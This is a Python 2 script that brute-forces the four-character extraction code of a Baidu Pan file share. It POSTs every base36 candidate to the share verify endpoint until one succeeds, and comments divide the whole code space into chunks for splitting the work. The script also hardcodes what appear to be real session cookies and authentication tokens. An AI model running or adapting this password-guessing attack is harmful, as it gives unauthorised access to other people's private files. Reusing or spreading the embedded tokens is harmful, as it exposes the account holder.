# -*- coding=UTF-8 -*-

import requests
import time
import sys
import json

HEADERS = {
    'Host': 'pan.baidu.com',
    'Connection': 'keep-alive',
    'Content-Length': '19',
    'Accept': '*/*',
    'Origin': 'http://pan.baidu.com',
    'X-Requested-With': 'XMLHttpRequest',
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Referer': 'http://pan.baidu.com/share/init?shareid=1046515860&uk=3657849661',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'zh-CN,zh;q=0.8,en;q=0.6,ja;q=0.4,zh-TW;q=0.2'
}

COOKIES = {
    'PANWEB':r'1',
    'bdshare_firstime':r'1411653525836',
    'cyberplayer.volume':r'100',
    'cyberplayer.mute':r'false',
    'cyberplayer.captionLabel':r'Off',
    'Hm_lvt_eb77799942fcf84785b5626e398e49ab':r'1425047348',
    'Hm_lpvt_eb77799942fcf84785b5626e398e49ab':r'1425047348',
    'Hm_lvt_cff0e385e8093ff91b8f1caa76188ac7':r'1425365255',
    'Hm_lpvt_cff0e385e8093ff91b8f1caa76188ac7':r'1426679186',
    'Hm_lvt_67160ce8bb040ba1a95a7d958ad6d376':r'1425365255',
    'Hm_lpvt_67160ce8bb040ba1a95a7d958ad6d376':r'1426679186',
    'Hm_lvt_b181fb73f90936ebd334d457c848c8b5':r'1426999751',
    'Hm_lpvt_b181fb73f90936ebd334d457c848c8b5':r'1426999751',
    'BDUSS':r'k2bUhFNW5acUxsaXFaOUM4MmQ5S2xVZkFWaVNoTndJQWROam9-M1VncHBFVXBWQVFBQUFBJCQAAAAAAAAAAAEAAABAU44vQXJjb3Bob2JpYQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAGmEIlVphCJVZW',
    'Hm_lvt_88eb6c1888589f3785dcca032b78bcce':r'1430586712,1432286640,1432287447,1432287448',
    'Hm_lpvt_88eb6c1888589f3785dcca032b78bcce':r'1432287448',
    'BAIDUID':r'529E6C37988568A8AD2687424D065456:FG=1',
    'BIDUPSID':r'9D727A4126438F4EBDE67BC6C0968EA5',
    'PSTM':r'1432823477',
    'BDRCVFR[feWj1Vr5u3D]':r'I67x6TjHwwYf0',
    'H_PS_PSSID':r'13457_11077_1432_14412_13245_13074_14392_10812_10211_12867_14167_14298_10562_12722_14156_14329_11888_13936_12794_13623_14370_8498_14195_14330',
    'BDCLND':r'bFU4mNiJIs%2Bwe5b6ayTmBNzbC5YKkiE0BxOqRtW0aMc%3D',
    '__utmt':r'1',
    '__utma':r'45832101.417282503.1411191128.1432829287.1432835023.179',
    '__utmb':r'45832101.32.9.1432840908685',
    '__utmc':r'45832101',
    '__utmz':r'45832101.1432286640.127.9.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided)',
    'PANPSC':r'15764759239977356265%3aJ3EsYsG7OQmQjF4iRXyYKLTF%2bAhCz1HaWWD7S%2f9bq3qLP%2bvr65cEvHwqL3pmO5KtQ1Cw5ht0xZ%2feMbM9ZuYdx0q7xbIsIsvhiKHsGu63QsGQYmcdXbk1d9x%2baLqtNJPlr523xshijdRTIly0PTP9AA%3d%3d',
    'Hm_lvt_773fea2ac036979ebb5fcc768d8beb67':r'1432838106,1432838181,1432838185,1432839112',
    'Hm_lpvt_773fea2ac036979ebb5fcc768d8beb67':r'1432840994',
    'Hm_lvt_adf736c22cd6bcc36a1d27e5af30949e':r'1432838106,1432838181,1432838186,1432839112',
    'Hm_lpvt_adf736c22cd6bcc36a1d27e5af30949e':r'1432840994'
}
       
url = 'http://pan.baidu.com/share/verify?shareid=3302022832&uk=3657849754'

def base36encode(number, alphabet='0123456789abcdefghijklmnopqrstuvwxyz'):
    """Converts an integer to a base36 string."""
    if not isinstance(number, (int, long)):
        raise TypeError('number must be an integer')

    base36 = ''
    sign = ''

    if number < 0:
        sign = '-'
        number = -number

    if 0 <= number < len(alphabet):
        return sign + alphabet[number]

    while number != 0:
        number, i = divmod(number, len(alphabet))
        base36 = alphabet[i] + base36

    return sign + base36

def base36decode(number):
    return int(number, 36)
    
def pad(number):
    return (4 - len(number)) * '0' + number

#0, 209952
#209952, 419904
#419904, 629856
#629856, 839808
#839808, 1049760
#1049760, 1259712
#1259712, 1469664
#1469664, 1679616  
f = open('1.txt', 'w')
for i in xrange(373000, 373003):
    pw = pad(base36encode(i))
    payload = {'pwd': pw}
    try:
        r = requests.post(url, data=payload, timeout=150)
    except Exception as e:
        print e
        print "Error1: %i\t\t\t%s" % (i, pw)
        sys.stdout.flush()
        continue
    try:
        f.write(str(r.status_code) + '\t' + str(r.headers) + '\n')
        js = json.loads(r.text)
        print "%i\t\t\t%s\t%s" % (i, pw, js['errno'])
        if js['errno'] == 0:
            print 'Success: %i\t\t\t%s\t%s' % (i, pw, r.text)
            break
        sys.stdout.flush()
    except Exception as e:
        print e
        print "Error2: %i\t\t\t%s\t%s" % (i, pw, r.text)
        sys.stdout.flush()
        continue

f.close()